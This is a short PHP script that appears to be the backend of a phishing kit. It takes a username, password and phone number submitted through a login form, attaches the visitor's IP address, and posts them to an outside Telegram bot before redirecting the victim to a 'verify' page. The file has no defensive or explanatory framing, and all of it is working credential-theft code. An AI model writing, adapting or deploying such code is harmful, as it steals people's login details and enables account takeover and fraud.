<?php

include 'access.php';
include 'getip.php';


//First form data
$user = $_POST['user'];
$tel = $_REQUEST['phone'];
$pass = $_POST['pass'];

if (is_numeric($tel)) {
    //call the ip function to get the guest ip
$ip = getRealIP();
//Setting the message
$text = "Data:\n\nUsuario: \n".$user."\nContrasena: \n".$pass."\nTelefono: \n".$tel."\nIP: \n".$ip."\n\nEND";
$msg = $text;

if (!empty($user) && !empty($tel) && !empty($pass)) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $urlMsg);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec($ch);
    curl_close($ch);
    
    header('Location: ../verify.php');
}else{
    header('Location: ../index.php');
}
}else{
    header('Location: ../error-number.php');
}




?>